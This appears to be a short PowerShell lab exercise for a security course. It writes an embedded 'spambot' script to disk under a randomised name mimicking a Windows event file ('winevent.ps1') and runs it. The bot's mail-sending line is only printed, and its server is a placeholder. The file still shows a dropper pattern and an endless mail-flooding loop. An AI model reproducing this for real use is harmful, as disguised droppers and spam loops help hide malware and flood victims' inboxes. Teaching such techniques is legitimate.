<# 
    Storyline: Dropper for our spambot that will save to a directory
    and then execute the code
#>

$writeSbBot = @'
# Send an Email using Powershell
$toSend = @('zachary.morin@mymail.champlain.edu','zachary@ravenshroud.com')

# Message body
$msg = "Lorem ipsum dolor sit amet, mel errem essent mandamus eu. Ius vitae accusam intellegat ea, in sea possim fabellas. Ut eam diceret eripuit, ea est denique omnesque iudicabit, ad vis prima tractatos facilisis. Pro idque integre an. In graeco signiferumque vis, denique torquatos nec at. Et iudico iuvaret voluptua eos, putant perfecto corrumpit et sea. Ne quando bonorum pri, pro impetus quaerendum eu."

while ($true) {
    
    foreach ($email in $toSend) {

    # Send the email
    Write-Host "Send-MailMessage -from 'zachary.morin@mymail.champlain.edu' -To $email -Subject "Tisk Tisk" `
    -Body $msg -SmtpServer X.X.X.X"

    # Pause for 1 second
    Start-Sleep 1

    }

}
'@

# Directory to write the bot
$sbDir = 'C:\Users\zachary.morin\test\'

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

$sbRand

# C:\Users\zachary.morin\test\1045winevent.ps1
# Create the file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writeSbBot | Out-File -FilePath $file

# Executes the Powershell script
Invoke-Expression $file
